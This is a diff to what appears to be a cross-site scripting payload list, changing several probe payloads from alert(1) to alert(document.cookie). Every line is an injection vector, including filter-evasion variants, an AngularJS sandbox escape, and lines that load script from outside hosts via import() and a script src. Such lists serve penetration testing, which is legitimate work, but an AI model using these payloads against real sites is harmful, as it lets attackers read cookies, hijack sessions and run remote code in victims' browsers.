@@ -5,15 +5,15 @@
    color:red;
 }
 
-"/>&lt;script>alert(1)&lt;/script>"/>
+"/>&lt;script>alert(document.cookie)&lt;/script>"/>
 
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\u002ex)alert(window\u002ex=1)')+eval(y)+\"'");}}}}
 
 <script>alert(1)%0d%0a-->%09</script
 
-' accesskey=X onclick=alert(1) '
+' accesskey=X onclick=alert(document.cookie) '
 
-' onmouseover=alert() '
+' onmouseover=alert(document.cookie) '
 
 <img src=x onmouseover=confirm()>
 
@@ -26,8 +26,8 @@
 
 '"; alert("XSS attack!"); //';
 
-<img src=x onerror=alert(1)>
-'-alert(1)-';"-alert(2)-"//"><svg/onload=alert(3)>
+<img src=x onerror=alert(document.cookie)>
+'-alert(document.cookie)-';"-alert(document.cookie)-"//"><svg/onload=alert(3)>
 <img src=totallyfake onerror=alert(1);//
 <img src=x onerror=import(‘//domain.com/‘);//
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
